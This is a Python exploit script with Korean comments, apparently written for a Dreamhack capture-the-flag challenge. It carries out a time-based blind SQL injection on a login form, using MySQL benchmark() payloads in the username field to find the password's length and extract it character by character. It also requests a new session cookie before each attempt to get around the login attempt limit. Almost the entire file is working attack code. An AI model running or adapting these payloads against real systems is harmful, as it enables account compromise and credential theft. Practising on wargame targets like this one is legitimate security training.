import requests
import time

url = "http://host3.dreamhack.games:13436"
# 세션 쿠키를 새로 발급받는 함수
# 블로그 게시물에 따르면, 로그인 시도 횟수 제한을 우회하기 위해
# 각 요청 전에 또는 주기적으로 새 세션을 받아야 할 수 있습니다[1].
def get_new_session_cookie(target_url):
    """지정된 URL에 접속하여 새로운 세션 쿠키를 얻습니다."""
    try:
        session = requests.Session()
        # 블로그에서는 기본 URL에 POST 요청을 보내 세션을 얻었으므로 유사하게 구현[1]
        # 실제 대상에 따라 GET 요청 또는 다른 경로일 수 있습니다.
        response = session.post(target_url, timeout=10)
        response.raise_for_status() # 요청 실패 시 예외 발생
        cookies = session.cookies.get_dict()
        if 'session' in cookies:
            # print(f"[*] New session obtained: {cookies['session']}") # 디버깅용
            return cookies
        else:
            print("[!] Failed to get 'session' cookie.")
            return None
    except requests.exceptions.RequestException as e:
        print(f"[!] Error getting new session: {e}")
        return None

# 1. 비밀번호 길이 확인 함수
def find_password_length(target_url, max_length=40, time_threshold=1.5, benchmark_count=300000000):
    """
    시간 기반 블라인드 SQL 인젝션을 사용하여 비밀번호 길이를 찾습니다.
    'benchmark' 함수를 이용하여 시간 지연을 유발합니다[1].
    """
    login_url = f'{target_url}/login' # 로그인 경로는 대상에 맞게 수정해야 할 수 있음
    print("[*] Attempting to find password length...")

    for length in range(1, max_length + 1):
        # 시도 횟수 초기화를 위해 새 세션 쿠키 받기[1]
        session_cookies = get_new_session_cookie(target_url)
        if not session_cookies:
            print(f"[!] Failed to get session for length {length}. Skipping.")
            time.sleep(1) # 잠시 대기 후 재시도 로직을 추가할 수도 있음
            continue

        # SQL 인젝션 페이로드 구성 (length 함수 사용)[1]
        # ' or if(length(password)={길이}, benchmark({지연횟수},1), 0) --
        # '-- ' 뒤의 공백은 주석 처리를 확실히 하기 위함입니다.
        payload = f"' or if(length(password)={length},benchmark({benchmark_count},1),0) -- "
        data = {'username': payload, 'password': 'dummy_password'} # password 필드도 전송[1]

        try:
            start_time = time.time()
            response = requests.post(login_url, data=data, cookies=session_cookies, timeout=20) # 타임아웃 증가
            end_time = time.time()
            response_time = end_time - start_time

            print(f"[*] Testing length: {length}, Response time: {response_time:.4f} seconds")

            # 응답 시간이 설정된 임계값보다 크면 길이가 일치하는 것으로 간주[1]
            if response_time > time_threshold:
                print(f"[+] Password length found: {length}")
                return length

        except requests.exceptions.Timeout:
             # 타임아웃이 발생한 경우, 조건이 참일 가능성이 높음 (benchmark 실행)
             print(f"[*] Timeout occurred while testing length: {length}. Assuming length found.")
             print(f"[+] Password length found: {length} (via timeout)")
             return length
        except requests.exceptions.RequestException as e:
            print(f"[!] Error during request for length {length}: {e}")
            time.sleep(1) # 잠시 대기

    print("[-] Password length not found within the specified range.")
    return None

# 2. 비밀번호 브루트포스 함수
def brute_force_password(target_url, password_length, time_threshold=1.5, benchmark_count=300000000):
    """
    알아낸 비밀번호 길이를 바탕으로 각 문자를 시간 기반 블라인드 SQL 인젝션으로 찾습니다.
    'ascii'와 'substr' 함수를 사용합니다[1].
    """
    login_url = f'{target_url}/login'
    password = ""
    # 일반적인 영문 대소문자, 숫자, 일부 특수문자 범위 (ASCII 33 ~ 126)[1]
    # 대상 환경에 따라 범위를 조절해야 할 수 있습니다.
    possible_chars = range(33, 127)

    print("[*] Starting password brute-force...")

    for i in range(1, password_length + 1):
        found_char = False
        for char_code in possible_chars:
            # 시도 횟수 초기화를 위해 새 세션 쿠키 받기[1]
            session_cookies = get_new_session_cookie(target_url)
            if not session_cookies:
                print(f"[!] Failed to get session for position {i}, char {chr(char_code)}. Skipping.")
                time.sleep(1)
                continue # 다음 문자로 넘어가지 않고 현재 문자 재시도를 위해 로직 수정 필요할 수 있음

            # SQL 인젝션 페이로드 구성 (ascii, substr 사용)[1]
            # ' or if(ascii(substr(password,{위치},1))={아스키코드}, benchmark({지연횟수},1), 0) --
            # substr 대신 mid, right(left(...)) 등 우회 함수가 필요할 수 있음[1]
            payload = f"' or if(ascii(substr(password,{i},1))={char_code},benchmark({benchmark_count},1),0) -- "
            data = {'username': payload, 'password': 'dummy_password'}

            try:
                start_time = time.time()
                response = requests.post(login_url, data=data, cookies=session_cookies, timeout=20) # 타임아웃 증가
                end_time = time.time()
                response_time = end_time - start_time

                # print(f"[*] Testing pos: {i}, char: {chr(char_code)}, time: {response_time:.4f}s") # 디버깅용

                # 응답 시간이 임계값보다 크면 해당 문자를 찾은 것으로 간주[1]
                if response_time > time_threshold:
                    found_char = True
                    password += chr(char_code)
                    print(f"[+] Found character at position {i}: {chr(char_code)}")
                    break # 다음 위치로 이동

            except requests.exceptions.Timeout:
                 # 타임아웃 발생 시 조건 참으로 간주
                 print(f"[*] Timeout occurred for pos: {i}, char: {chr(char_code)}. Assuming character found.")
                 found_char = True
                 password += chr(char_code)
                 print(f"[+] Found character at position {i}: {chr(char_code)} (via timeout)")
                 break # 다음 위치로 이동
            except requests.exceptions.RequestException as e:
                print(f"[!] Error during request for position {i}, char {chr(char_code)}: {e}")
                time.sleep(1) # 잠시 대기

        if not found_char:
            print(f"[-] Could not find character for position {i}.")
            # 오류 처리: 특정 위치에서 문자를 찾지 못했을 때 어떻게 처리할지 결정 (e.g., '?' 추가, 중단)
            password += "?" # 예시로 '?' 추가

    print(f"[+] Completed brute-force. Potential Password: {password}")
    return password

# 메인 실행 부분
if __name__ == "__main__":
    target_site_url = url

    # URL 끝에 '/'가 없으면 추가
    if not target_site_url.endswith('/'):
        target_site_url += '/'

    # 1단계: 비밀번호 길이 찾기
    # length = find_password_length(target_site_url)
    length = 32
    # 2단계: 비밀번호 브루트포스 (길이를 찾았을 경우)
    if length:
        brute_force_password(target_site_url, length)
    else:
        print("[!] Failed to determine password length. Cannot proceed with brute-force.")

